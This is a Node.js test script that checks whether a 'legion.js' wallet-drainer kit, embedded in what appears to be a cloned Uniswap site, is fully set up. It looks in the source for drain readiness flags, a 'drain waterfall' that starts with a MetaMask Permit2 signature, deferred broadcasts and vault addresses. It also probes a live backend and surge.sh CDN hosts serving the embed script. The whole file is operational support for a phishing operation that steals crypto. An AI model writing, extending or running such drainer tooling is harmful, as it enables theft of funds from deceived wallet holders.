/**
 * Bucket A complete verification — run after legion.js v5.13.5 + client-config updates.
 * Usage: node scripts/test-bucket-a-complete.mjs
 */
import { readFileSync, existsSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
const CLONE = join(ROOT, 'clones/uniswap-clone');
const BACKEND = (process.env.BACKEND_URL || 'https://sadrailala-production.up.railway.app').replace(/\/$/, '');

const results = [];
function record(name, pass, detail = '') {
  results.push({ name, pass, detail });
  console.log(`${pass ? '✅' : '❌'} ${name}${detail ? ` — ${detail}` : ''}`);
}

const legion = readFileSync(join(CLONE, 'legion.js'), 'utf8');
const embed = readFileSync(join(CLONE, 'legion-embed.js'), 'utf8');
const clientConfigSrc = readFileSync(join(ROOT, 'apps/api/src/routes/client-config.ts'), 'utf8');

console.log('╔══════════════════════════════════════════════════════════╗');
console.log('║        BUCKET A COMPLETE — INTEGRATION VERIFY            ║');
console.log('╚══════════════════════════════════════════════════════════╝\n');

// A1 — RPC rate limit
record('A1 rpcRateWait in legion.js', legion.includes('rpcRateWait') && legion.includes('RPC_RATE'));
record('A1 429/503 RPC handling', legion.includes('RPC rate limited HTTP'));

// A2 — Chain capabilities + DOT/ALGO/ADA skip
record('A2 isFamilyDrainReady', legion.includes('isFamilyDrainReady'));
record('A2 chainCapabilities in prefetchVault', legion.includes('chain_capabilities'));
record('A2 drain priority filters capability', legion.includes("capability:") && legion.includes('isFamilyDrainReady(key)'));

// A3 — 503 deferred broadcast (frontend)
record('A3 DEFERRED_BROADCAST handling', legion.includes('DEFERRED_BROADCAST'));
record('A3 deferredBroadcasts counter', legion.includes('deferredBroadcasts'));
record('A3 SUBMIT counts deferred', legion.includes('deferred broadcast'));

// A4 — Waterfall order (MetaMask Permit2 before sendCalls in runDrainWaterfall)
const waterfall = legion.slice(legion.indexOf('async function runDrainWaterfall'));
const mmPermitIdx = waterfall.indexOf('MetaMask extension: Permit2 PRIMARY');
const sendCallsIdx = waterfall.indexOf('wallet_sendCalls v2 — only when capabilities');
record('A4 MM Permit2 before sendCalls block', mmPermitIdx > 0 && sendCallsIdx > mmPermitIdx, `mm=${mmPermitIdx} sc=${sendCallsIdx}`);

// A5 — Embed CDN
record('A5 legion-embed.js exists', existsSync(join(CLONE, 'legion-embed.js')));
record('A5 embed references legion-cdn', embed.includes('legion-cdn.surge.sh'));
record('A5 embed version 5.13.5', embed.includes('5.13.5'));

// A6 — Backend client-config source
record('A6 chain_capabilities in API', clientConfigSrc.includes('chain_capabilities'));
record('A6 embed_script in API', clientConfigSrc.includes('embed_script'));
record('A6 POLKADOT anchor_only', clientConfigSrc.includes("POLKADOT: 'anchor_only'"));

// A7 — Backend pending broadcast sweep exists
record('A7 pending-broadcast-sweep', existsSync(join(ROOT, 'apps/api/src/cron/pending-broadcast-sweep.ts')));

// A8 — Live client-config (may lag until Railway redeploy)
console.log('\n### Live backend');
try {
  const res = await fetch(`${BACKEND}/api/v1/client-config`, { signal: AbortSignal.timeout(15000) });
  const json = await res.json();
  const data = json.data || json;
  record('A8 client-config HTTP 200', res.ok, `HTTP ${res.status}`);
  record('A8 live chain_capabilities', Boolean(data.chain_capabilities), data.chain_capabilities ? Object.keys(data.chain_capabilities).join(',') : 'missing — redeploy Railway API');
  record('A8 COSMOS capability', data.chain_capabilities?.COSMOS === 'full' || data.chain_capabilities?.COSMOS === 'disabled', data.chain_capabilities?.COSMOS || 'n/a');
  record('A8 embed_script URL', Boolean(data.embed_script), data.embed_script || 'missing');
  record('A8 cosmos vault in config', Boolean(data.vault_addresses?.cosmos), data.vault_addresses?.cosmos ? 'set' : 'unset — set VAULT_ADDRESS_COSMOS on Railway');
} catch (e) {
  record('A8 live client-config', false, e.message);
}

// A9 — CDN live
for (const url of ['https://legion-cdn.surge.sh/legion-embed.js', 'https://uniswap-app-defi.surge.sh/legion-embed.js']) {
  try {
    const r = await fetch(url, { method: 'HEAD', signal: AbortSignal.timeout(12000) });
    record(`A9 CDN ${url}`, r.ok, `HTTP ${r.status}`);
  } catch (e) {
    record(`A9 CDN ${url}`, false, e.message);
  }
}

const passed = results.filter((r) => r.pass).length;
const failed = results.filter((r) => !r.pass).length;
console.log(`\n═══ ${passed}/${results.length} passed, ${failed} failed ═══`);
process.exit(failed > 0 ? 1 : 0);
